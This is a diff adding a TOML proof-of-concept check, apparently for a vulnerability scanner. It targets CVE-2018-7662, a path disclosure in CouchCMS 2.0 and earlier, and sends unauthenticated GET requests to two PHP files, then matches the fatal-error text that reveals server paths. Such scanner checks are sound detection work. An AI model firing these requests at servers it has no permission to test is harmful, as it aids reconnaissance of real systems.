@@ -1,0 +1,48 @@
+[info]
+author = "ave"
+description = "CouchCMS 2.0 及之前版本存在路径泄露漏洞，远程攻击者无需身份认证，直接向 includes/mysql2i/mysql2i.func.php 或 addons/phpmailer/phpmailer.php 发送 GET 请求即可触发 PHP 致命错误，导致服务器在错误信息中泄露完整物理路径。"
+id = "POC-AVE-2018-0202"
+name = "CVE-2018-7662 PoC"
+severity = "medium"
+tags = ["ave-2018-0202"]
+vuln_id = [
+    "CVE-2018-7662",
+    "AVE-2018-0202",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/includes/mysql2i/mysql2i.func.php"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["mysql2i.func.php on line 10"]
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["Fatal error: Cannot redeclare mysql_affected_rows() in"]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/addons/phpmailer/phpmailer.php"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["phpmailer.php on line 10"]
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["Fatal error: Call to a menber function add_event_listener() on a non-object in"]
